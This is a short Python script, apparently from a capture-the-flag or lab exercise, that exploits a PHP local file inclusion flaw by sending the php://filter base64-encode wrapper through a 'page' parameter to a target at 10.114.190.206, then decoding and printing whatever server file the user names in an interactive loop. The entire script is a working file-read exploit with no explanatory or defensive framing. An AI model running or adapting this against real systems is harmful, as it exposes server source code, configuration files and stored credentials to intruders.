import requests
import base64

while True :
    file = input("[+]File => ")
    response = requests.get(f'http://10.114.190.206/index.php?page=php://filter/convert.base64-encode/resource={file}')
    decoded = base64.b64decode(response.text)
    print(decoded.decode('utf-8'))
